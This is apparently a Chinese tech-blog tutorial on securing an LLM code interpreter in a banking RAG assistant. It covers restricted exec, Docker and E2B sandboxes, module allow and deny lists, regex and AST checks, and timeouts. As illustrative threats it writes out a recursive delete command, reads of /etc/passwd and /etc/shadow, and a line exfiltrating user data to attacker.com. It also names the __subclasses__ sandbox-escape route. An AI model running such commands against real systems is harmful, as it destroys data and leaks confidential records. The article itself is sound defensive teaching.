---
title: 阿里面试官问："你的 Agent 能执行代码，用户传了个恶意脚本直接删库，沙箱怎么做的？exec() 直接用吗？白名单怎么定义？"
author: 吴师兄学大模型
date: 
url: https://mp.weixin.qq.com/s?__biz=MzkzMDIwMzg1Mw==&mid=2247490020&idx=1&sn=c8fdf3f389a5b41fe98491e15a7d7154&chksm=c332da0188cd3cb568021be85cea32148c4271b5b68cd962d740a3561452c53cf94a285d1fb3&mpshare=1&scene=24&srcid=04223IujVhklTepYCdD66OPl&sharer_shareinfo=87af2df7db43500b7cf6d6c812d692be&sharer_shareinfo_first=87af2df7db43500b7cf6d6c812d692be#rd
---

# 大家好，我是吴师兄。

上周有个学员去阿里面试大模型工程师，被问到了一个他完全没准备的问题，面完之后来找我复盘。

面试官问："你简历上写了做过 RAG 系统，里面有没有集成 Code Interpreter？"

他答："有，我们让 Agent 帮用户分析上传的 Excel 文件，自动生成图表。"

面试官接着问："代码是怎么执行的？直接 exec() 吗？"

他答："对，用 exec() 把 LLM 生成的代码跑起来。"

面试官皱了皱眉："用户传了个恶意脚本，一行代码直接把服务器文件删了，你怎么办？沙箱机制有没有？"

他开始支吾："我们有做一些过滤……"

面试官追问："怎么过滤的？白名单还是黑名单？允许哪些模块、禁止哪些模块，有没有系统性设计？"

他彻底答不上来了。

面试官最后说了一句话："Code Interpreter 是 Agent 的能力边界扩展，但安全边界是它的命门，这是生产系统必须搞清楚的事情。"

今天把 Code Interpreter 从沙箱安全到工程落地，全部讲清楚。

## 为什么 RAG 系统需要 Code Interpreter

先回到问题的起点：RAG 系统能做什么，不能做什么？

我们做的项目叫"拓业智询"，是一家银行为对公客户经理设计的智能咨询助手。早期版本是标准的 RAG 架构：客户经理问"这款理财产品的锁定期是多久"，系统去向量数据库检索相关文档，返回答案。这类"查询知识"的场景，RAG 表现很好。

但客户经理很快提出了另一类需求："我这里有 100 个企业客户，帮我分析一下他们的风险评级分布，画个饼图，标出高风险客户比例。"

这个需求，纯 RAG 根本无法满足。原因很简单：RAG 的本质是"检索+生成文本"，它不会执行计算，不会处理结构化数据，不会生成图表。

用户上传了一个 Excel 文件，里面有 100 行企业数据，每行有营收、负债率、现金流等字段。要完成这个任务，系统必须能够：

1. 读取 Excel 文件，解析成结构化数据
2. 按照用户需求写分析代码
3. 执行这段代码
4. 把图表结果返回给用户

这就是 Code Interpreter 的价值所在：它让 Agent 从"查询知识"升级为"执行计算"。

OpenAI 在 2023 年发布 ChatGPT Code Interpreter 时，这个功能一夜之间让所有人意识到 LLM 的能力边界可以扩展到哪里。用户可以上传数据文件，AI 自动编写 Python 代码，在沙箱里执行，返回图表和分析结论。

我们在"拓业智询"里做的事情类似：客户经理上传企业财务数据（Excel 格式），AI 自动分析企业财务健康度，生成可视化报告，包含偿债能力、盈利能力、运营效率三个维度的雷达图。

这个功能上线之后，客户经理的工作效率提升非常明显。但随之而来的，是一个我们在设计阶段就必须认真对待的问题：安全。

需求清楚了，接下来的问题是：怎么安全地执行 LLM 生成的代码？

## exec() 直接用，有多危险

在讲安全方案之前，我们先把危险性说清楚，这样才能理解为什么要设计这么复杂的沙箱。

当 Agent 调用 Code Interpreter 时，大致流程是：LLM 根据用户需求生成一段 Python 代码，系统执行这段代码，返回结果。

最直接的执行方式：

```
code = llm.generate(user_request) exec(code)  # 直接执行，完全没有任何防护
```

这段代码的危险程度，用三个攻击场景来说明。

**攻击场景 1：删除服务器文件**

```
import os os.system("rm -rf /data/production")
```

如果 LLM 被注入了恶意指令，或者用户直接在请求里嵌入这段逻辑，exec() 会毫不犹豫地执行。生产数据库文件、模型权重文件、用户上传的所有数据，全部可以被清空。

**攻击场景 2：读取系统敏感文件**

```
passwd_content = open('/etc/passwd').read() shadow_content = open('/etc/shadow').read() print(passwd_content)
```

服务器的用户账户信息、加密后的密码哈希，就这样被读出来打印在日志里，或者通过其他方式泄露出去。

**攻击场景 3：网络外传敏感数据**

```
import requests sensitive_data = df.to_json()  # df 是用户上传的企业财务数据 requests.get('http://attacker.com/collect', params={'data': sensitive_data})
```

用户刚上传的 100 家企业的财务数据，被悄悄发送到攻击者的服务器。整个过程对用户完全透明，日志里只显示"代码执行成功"。

这三个场景不是假设，而是真实存在的攻击面。在银行场景里，数据安全是红线，一旦出现数据泄露，不只是技术问题，还是合规问题。

所以，"exec() 直接用"这条路，在生产环境中是不可接受的。

知道了危险在哪，我们来看有哪几种沙箱方案可以选。

## 沙箱设计的三种方案

我们在设计"拓业智询"的 Code Interpreter 模块时，评估了三种沙箱方案，安全等级依次递增，成本和复杂度也随之提升。

代码沙箱白名单/黑名单设计

### 方案一：Python 受限执行环境（低成本，中等安全）

这是最轻量的方案，核心思路是：不禁止 exec()，而是限制 exec() 的执行环境。

Python 的 exec() 函数可以接受第二个参数 globals 和第三个参数 locals，来控制代码的执行上下文。通过精心构造一个受限的 globals 字典，我们可以：

* 只暴露安全的内置函数（比如 print、len、range），屏蔽危险的内置函数（比如 open、\_\_import\_\_）
* 只预加载允许的模块（pandas、numpy、matplotlib），不允许代码自行 import
* 在执行前做静态扫描，检测危险的代码模式

完整实现如下：

```
ALLOWED_MODULES = {'pandas', 'numpy', 'matplotlib', 'json', 'math', 'statistics'} FORBIDDEN_BUILTINS = {'exec', 'eval', 'open', 'import', '__import__', 'compile'}  def safe_exec(code: str, user_data: dict = None) -> dict:     """在受限环境中执行Python代码"""     # 构建安全的执行环境     safe_globals = {         '__builtins__': {k: v for k, v in __builtins__.items()                         if k not in FORBIDDEN_BUILTINS},         'pd': __import__('pandas'),         'np': __import__('numpy'),         'plt': __import__('matplotlib.pyplot'),     }     if user_data:         safe_globals.update(user_data)      # 静态检查：扫描危险模式     forbidden_patterns = ['import os', 'import sys', 'subprocess',                          '__class__', '__bases__', 'open(']     for pattern in forbidden_patterns:         if pattern in code:             raise SecurityError(f"禁止使用: {pattern}")      local_vars = {}     exec(code, safe_globals, local_vars)     return local_vars
```

这个方案的逻辑很清晰：我们把"可以用什么"列成白名单，提前 import 好放进 safe\_globals；同时把"不能出现什么"列成黑名单，在执行前做字符串扫描。

但这个方案有一个重要局限：Python 的对象系统可以绕过 \_\_builtins\_\_ 限制。经验丰富的攻击者可以通过 `[].__class__.__bases__[0].__subclasses__()` 这类方式，遍历对象继承链，找到危险的类。所以这个方案适合开发测试和对安全要求不是极高的内部系统，不适合直接暴露在公网上的生产服务。

### 方案二：Docker 容器隔离（高安全，有启动延迟）

Docker 方案的思路是：彻底隔离执行环境。每次代码执行，都在一个全新的 Docker 容器里进行，容器销毁后，执行痕迹完全消失。

关键配置：

```
import docker import tempfile import os  def execute_in_docker(code: str, user_data_path: str) -> dict:     client = docker.from_env()      with tempfile.TemporaryDirectory() as tmpdir:         # 将代码写入临时文件         code_file = os.path.join(tmpdir, 'script.py')         with open(code_file, 'w') as f:             f.write(code)          # 启动受限容器         container = client.containers.run(             image='python-sandbox:latest',  # 预构建的最小化镜像             command=f'python /sandbox/script.py',             volumes={                 tmpdir: {'bind': '/sandbox', 'mode': 'ro'},                 user_data_path: {'bind': '/data', 'mode': 'ro'},             },             network_disabled=True,          # 禁止网络访问             mem_limit='256m',               # 内存限制             cpu_period=100000,             cpu_quota=50000,                # CPU 限制 50%             read_only=True,                 # 只读文件系统             tmpfs={'/tmp': 'size=64m'},     # 临时写入目录             remove=True,                    # 执行完自动删除             timeout=10,                     # 10秒超时             detach=False,         )          return parse_output(container)
```

这个方案的安全性非常高：

* `network_disabled=True`

  完全切断网络，攻击场景 3（数据外传）完全不可能发生
* `read_only=True`

  加上只挂载 `/tmp` 为可写，代码无法修改系统文件
* `mem_limit`

  和 `cpu_quota` 防止恶意代码耗尽服务器资源
* 容器销毁后，所有执行痕迹消失，不存在状态污染

唯一的代价是延迟。Docker 容器启动时间大约在 500ms-2s，对于实时交互场景，这个延迟用户是能感知到的。我们的解决方案是维护一个"预热容器池"，提前启动若干容器待命，请求进来直接分配，而不是临时创建。

### 方案三：E2B 云端沙箱（推荐生产使用）

E2B（e2b.dev）是专门为 AI 应用提供代码执行沙箱的云服务。它的本质是托管的微虚拟机沙箱，安全性比 Docker 更高，但使用方式非常简单：

```
from e2b_code_interpreter import Sandbox  def execute_with_e2b(code: str, csv_data: str) -> dict:     with Sandbox() as sandbox:         # 上传用户数据         sandbox.files.write('/home/user/data.csv', csv_data)          # 执行代码         execution = sandbox.run_code(code)          if execution.error:             return {'success': False, 'error': execution.error.value}          # 获取图表输出         charts = []         for result in execution.results:             if result.png:                 charts.append(result.png)  # base64 编码的图片          return {             'success': True,             'output': execution.text,             'charts': charts,         }
```

E2B 的优势在于：安全性由服务商保证，不需要自己维护沙箱基础设施；启动时间约 100ms；支持文件上传下载和图表输出。代价是按次计费，量大时成本会上升。

对于快速上线的产品，E2B 是最省心的选择。我们在"拓业智询"的第一个生产版本就是用 E2B，后来随着调用量增加，才逐步迁移到自建 Docker 方案。

沙箱方案选定之后，还有一个更细节的问题需要回答：允许哪些模块、禁止哪些模块，如何做到系统性覆盖而不遗漏攻击面？

## 白名单与黑名单的系统性设计

无论用哪种沙箱方案，白名单和黑名单的设计都是核心。很多团队在这里犯的错误是：只列了几个显而易见的危险模块（比如 os、sys），但漏掉了很多隐蔽的攻击面。

Code Interpreter 安全执行8步流程

我们在设计白名单时遵循的原则是"最小权限"：只开放业务真正需要的能力，其他一律禁止。

**允许的模块（白名单）：**

针对"拓业智询"的数据分析场景，我们的白名单如下：

```
ALLOWED_MODULES = {     'pandas',       # 数据处理，读取 DataFrame，基础统计     'numpy',        # 数值计算，矩阵运算     'matplotlib',   # 可视化，生成图表     'seaborn',      # 高级可视化（基于 matplotlib）     'json',         # JSON 数据格式处理     'math',         # 基础数学函数     'statistics',   # 统计函数（均值、方差等）     'datetime',     # 日期时间处理（财务数据经常需要）     'collections',  # Counter、defaultdict 等工具类 }
```

**禁止的模块和函数（黑名单）：**

```
FORBIDDEN_MODULES = {     'os',           # 系统操作，可以执行 shell 命令     'sys',          # 系统模块，可以修改 Python 运行时     'subprocess',   # 子进程，可以执行任意系统命令     'socket',       # 网络 socket，可以建立任意网络连接     'requests',     # HTTP 请求，可以外传数据     'urllib',       # URL 处理，同上     'http',         # HTTP 库     'ftplib',       # FTP，文件传输     'smtplib',      # 邮件发送，可以泄露数据     'pickle',       # 反序列化，存在代码执行漏洞     'shelve',       # 基于 pickle，同上     'ctypes',       # 调用 C 库，可以绕过 Python 层限制     'cffi',         # 同上     'importlib',    # 动态 import，可以绕过模块白名单     'builtins',     # 内置模块，可以重新访问被屏蔽的函数 }  FORBIDDEN_BUILTINS = {     'exec',         # 动态代码执行     'eval',         # 表达式求值（同样危险）     'compile',      # 编译代码对象     'open',         # 文件 IO     '__import__',   # 动态 import     'vars',         # 访问对象变量字典，可以探测内部状态     'globals',      # 访问全局变量     'locals',       # 访问局部变量     'dir',          # 列出对象属性，辅助攻击者探测     'getattr',      # 属性访问，可以绕过一些限制     'setattr',      # 属性设置     'delattr',      # 属性删除 }
```

**静态扫描的危险模式：**

除了模块和函数黑名单，我们还对代码字符串做正则扫描，检测一些特定的攻击模式：

```
import re  DANGEROUS_PATTERNS = [     r'__class__',           # 对象继承链遍历     r'__bases__',           # 基类访问     r'__subclasses__',      # 子类枚举，Python 沙箱逃逸的常见手段     r'__globals__',         # 全局变量访问     r'__builtins__',        # 内置函数访问     r'__code__',            # 函数代码对象     r'__dict__',            # 对象字典     r'chr\(\s*\d+\s*\)',    # chr() 可以用来构造被过滤的字符串     r'\\x[0-9a-fA-F]{2}',  # 十六进制转义，绕过字符串过滤     r'exec\s*\(',           # exec 调用     r'eval\s*\(',           # eval 调用     r'open\s*\(',           # open 调用     r'import\s+os',         # os 模块 import     r'import\s+sys',        # sys 模块 import     r'import\s+subprocess', # subprocess import ]  def static_security_check(code: str) -> tuple[bool, str]:     """静态安全检查，返回 (is_safe, reason)"""     for pattern in DANGEROUS_PATTERNS:         if re.search(pattern, code):             return False, f"检测到危险模式: {pattern}"     return True, ""
```

这里有一个值得注意的细节：`chr(111) + chr(115)` 可以构造出字符串 "os"，然后通过 `__import__()` 加载 os 模块，绕过简单的字符串匹配。所以我们专门加了 `chr()` 调用的检测规则。

白名单和黑名单设计好之后，需要把它们嵌入到一套完整的执行流程里，才能真正发挥作用。

## 8 步完整代码执行流程

把以上所有安全机制串起来，形成一个完整的代码执行流程：

三种Code Interpreter沙箱方案对比

**第一步：接收用户请求和数据文件**

用户上传 Excel 文件，系统读取文件内容，转换为 pandas DataFrame，同时记录数据的行列信息。我们加了一个硬性限制：单次处理最多 10000 行，超过则截断并提示用户。这既是安全考虑（防止超大文件耗尽内存），也是性能考虑（避免执行时间超过 10 秒限制）。

```
def load_user_data(file_path: str) -> pd.DataFrame:     df = pd.read_excel(file_path)     if len(df) > 10000:         df = df.head(10000)         logger.warning(f"数据行数超过限制，已截断至10000行")     return df
```

**第二步：LLM 生成代码（受限 Prompt 引导）**

这一步的关键是 Prompt 设计。不能只是告诉 LLM"生成分析代码"，而是要明确限定代码的约束条件：

```
你是数据分析代码生成器。生成的Python代码必须遵守以下限制： 1. 只能使用 pandas, numpy, matplotlib 库 2. 不能使用 os, sys, subprocess 等系统模块 3. 不能读写系统文件（用户数据已预加载为变量 df） 4. 代码必须能在10秒内执行完毕 5. 生成图表时保存为 result.png  可用变量：df（用户上传的数据，pandas DataFrame格式） 列名信息：{df.columns.tolist()} 数据类型：{df.dtypes.to_dict()}  用户需求：{user_request}  请直接输出Python代码，不要添加任何解释。
```

通过在 Prompt 里明确告知列名和数据类型，LLM 可以生成更准确的代码，减少因列名拼写错误导致的执行失败。

**第三步：静态安全检查**

对 LLM 生成的代码执行前面设计的静态扫描，检测危险模式。如果检测到危险内容，直接拒绝，不进入沙箱。

```
is_safe, reason = static_security_check(generated_code) if not is_safe:     logger.error(f"代码安全检查失败: {reason}\n代码内容: {generated_code}")     return {'success': False, 'error': '生成的代码包含不安全操作，已被拦截'}
```

**第四步：进入沙箱环境**

根据部署环境选择沙箱方案。开发环境用受限 exec，生产环境用 Docker 或 E2B。

**第五步：超时监控**

这是一个独立的安全控制点。即使代码通过了静态检查，也可能包含死循环或计算量过大的操作。我们用 Python 的 `signal` 模块（Unix 系统）或 `threading` 设置超时：

```
import signal  class TimeoutError(Exception):     pass  def timeout_handler(signum, frame):     raise TimeoutError("代码执行超时（10秒限制）")  def execute_with_timeout(code: str, safe_globals: dict, timeout_seconds: int = 10):     signal.signal(signal.SIGALRM, timeout_handler)     signal.alarm(timeout_seconds)     try:         local_vars = {}         exec(code, safe_globals, local_vars)         return local_vars     finally:         signal.alarm(0)  # 取消超时
```

**第六步：执行并捕获输出**

捕获 stdout、stderr，以及生成的图片文件：

```
import io import sys import base64  # 重定向标准输出 stdout_capture = io.StringIO() sys.stdout = stdout_capture  try:     result = execute_with_timeout(code, safe_globals) finally:     sys.stdout = sys.__stdout__  output_text = stdout_capture.getvalue()  # 捕获生成的图片 chart_b64 = None chart_path = os.path.join(tmpdir, 'result.png') if os.path.exists(chart_path):     with open(chart_path, 'rb') as f:         chart_b64 = base64.b64encode(f.read()).decode('utf-8')
```

**第七步：清理临时资源**

删除临时文件，如果是 Docker 方案则销毁容器。确保用户数据不会残留在服务器上。

**第八步：返回结果给用户**

将文本输出、图表（base64 编码）打包返回，前端解码显示。

理论上的流程设计清楚了，但真正把这套机制落地到生产环境，中间有不少坑。

## 实战踩坑记录

把"拓业智询"从开发到生产这一路遇到的真实问题整理如下，这些坑都是用时间和故障换来的。

**坑一：Matplotlib 在无头服务器上渲染失败**

在本地开发时，matplotlib 正常生成图表。部署到 Linux 服务器后，代码报错：`_tkinter.TclError: no display name and no $DISPLAY environment variable`。

原因是 matplotlib 默认使用 Tkinter 作为渲染后端，而服务器没有图形界面。解决方案是在代码执行前设置后端：

```
import matplotlib matplotlib.use('Agg')  # 使用非交互式后端，不需要显示器 import matplotlib.pyplot as plt
```

这一行必须在 `import matplotlib.pyplot` 之前执行，否则无效。我们把这行代码直接放进 safe\_globals 的初始化逻辑里，确保每次执行都生效。

**坑二：用户数据量大导致执行超时**

一个客户经理上传了一个 5 万行的企业数据表，要求做聚类分析。代码里用了 K-means，在这个数据量下跑了 30 多秒，远超 10 秒限制，每次都被超时中断。

我们的处理方案是两层限制：

```
# 第一层：数据加载时截断 MAX_ROWS = 10000 if len(df) > MAX_ROWS:     df = df.sample(n=MAX_ROWS, random_state=42)  # 随机采样而非直接截断  # 第二层：在 Prompt 里提醒 LLM 注意效率 prompt_suffix = f""" 注意：数据集有 {len(df)} 行。如果需要使用复杂算法（如聚类、矩阵分解）， 请先对数据进行采样（最多1000行）再运行，以确保在10秒内完成。 """
```

**坑三：图片返回给前端后显示模糊**

生成的图表在前端显示后分辨率很低，尤其是包含中文文字的图表，字体渲染模糊。

原因是 matplotlib 默认的 DPI 是 100，输出图片尺寸较小。同时，默认字体不支持中文，中文字符会显示为方块。

解决方案：

```
# 在 safe_globals 里预配置 matplotlib import matplotlib.pyplot as plt import matplotlib.font_manager as fm  # 设置中文字体（需要在服务器上安装 SimHei 或使用系统字体） plt.rcParams['font.sans-serif'] = ['SimHei', 'DejaVu Sans'] plt.rcParams['axes.unicode_minus'] = False  # 解决负号显示问题 plt.rcParams['figure.dpi'] = 150           # 提高分辨率 plt.rcParams['figure.figsize'] = (10, 6)   # 标准尺寸
```

**坑四：LLM 偶尔生成语法错误的代码**

LLM 不是 100% 可靠的，偶尔会生成有语法错误的 Python 代码，直接 exec 会抛出 SyntaxError。我们加了一层语法预检查：

```
import ast  def syntax_check(code: str) -> tuple[bool, str]:     try:         ast.parse(code)         return True, ""     except SyntaxError as e:         return False, f"代码语法错误: {e}"
```

使用 `ast.parse()` 做语法检查，比直接 exec 更安全，因为它只解析不执行，不会触发任何副作用。同时，ast 模块还可以用来做更精细的代码分析，比如检查所有的 import 语句，验证是否都在白名单里：

```
def check_imports(code: str) -> tuple[bool, str]:     tree = ast.parse(code)     for node in ast.walk(tree):         if isinstance(node, ast.Import):             for alias in node.names:                 module_name = alias.name.split('.')[0]                 if module_name not in ALLOWED_MODULES:                     return False, f"禁止 import 模块: {module_name}"         elif isinstance(node, ast.ImportFrom):             if node.module:                 module_name = node.module.split('.')[0]                 if module_name not in ALLOWED_MODULES:                     return False, f"禁止 from {node.module} import"     return True, ""
```

这比正则扫描更可靠，因为它是基于 AST（抽象语法树）的分析，不会被字符串拼接等手段绕过。

工程层面的坑都踩过一遍之后，最后回到面试场景，看看这道题的正确回答方式。

## 面试怎么答 Code Interpreter 安全设计

这是一个考察系统设计能力和安全意识的问题，面试官想看到的不只是"我知道有沙箱"，而是"我理解为什么需要沙箱，以及如何系统性地设计"。

推荐的回答框架分三层：

**第一层：先说清楚威胁模型**

"Code Interpreter 最核心的安全问题是：LLM 生成的代码是不可信的，用户输入也是不可信的。攻击面主要有三类：系统命令执行（通过 os/subprocess）、文件系统读写（通过 open）、网络数据外传（通过 requests/socket）。"

**第二层：说沙箱方案的选择逻辑**

"针对不同安全等级的需求，有三种方案：受限 exec 环境（低成本，适合内部系统）、Docker 容器隔离（高安全，适合生产）、E2B 云端沙箱（托管方案，适合快速上线）。选择的关键因素是安全等级要求、可接受的延迟，以及运维成本。"

**第三层：说白名单/黑名单的系统性设计**

"不能只列几个显而易见的危险模块。白名单要按业务场景定义（数据分析场景只需要 pandas/numpy/matplotlib 等），黑名单要覆盖所有攻击面，包括模块、内置函数、危险代码模式（比如 Python 沙箱逃逸用到的 \_\_subclasses\_\_ 遍历）。同时要用 ast.parse 做语法级分析，比字符串匹配更可靠。"

如果面试官继续追问"如何防止 Python 沙箱逃逸"，可以直接说：受限 exec 无法完全防止有经验的攻击者通过继承链遍历等手段逃逸，这是 Python 语言本身的限制。生产环境推荐使用 Docker 或专用沙箱（E2B），用操作系统级别的隔离替代语言级别的限制，安全性更有保证。

这个回答展示了对问题边界的清醒认识，比说"白名单就能解决所有问题"要有说服力得多。

## 总结

Code Interpreter 让 Agent 从"知识检索工具"进化为"数据分析助手"，这是 RAG 系统能力的重要扩展。但能力越大，安全责任越大。

核心结论：

第一，exec() 直接用在生产环境是不可接受的，攻击场景不是假设，而是真实存在的威胁。

第二，安全设计要有纵深：Prompt 层（引导 LLM 生成安全代码）+ 静态扫描层（正则+AST 分析）+ 沙箱执行层（受限环境或容器隔离）+ 超时监控层，四层叠加才是完整方案。

第三，白名单比黑名单更安全。黑名单是"已知的危险都禁止"，白名单是"未明确允许的都禁止"。业务场景清晰时，优先用白名单。

第四，ast.parse 比字符串正则扫描更可靠，能检测到更精细的代码结构，不容易被字符串拼接等手段绕过。

在"拓业智询"项目里，这套方案上线后经过了三个月的生产验证，拦截了数十次异常代码（大部分是 LLM 生成时意外包含了 import os 这类代码，少数是测试人员的渗透测试）。客户经理的数据分析需求得到了有效支持，同时没有发生任何安全事故。

我是吴师兄，我们下篇文章见。

*本文内容基于吴师兄大模型训练营 RAG 实战系列课程整理。系列往期文章可在主页查看。*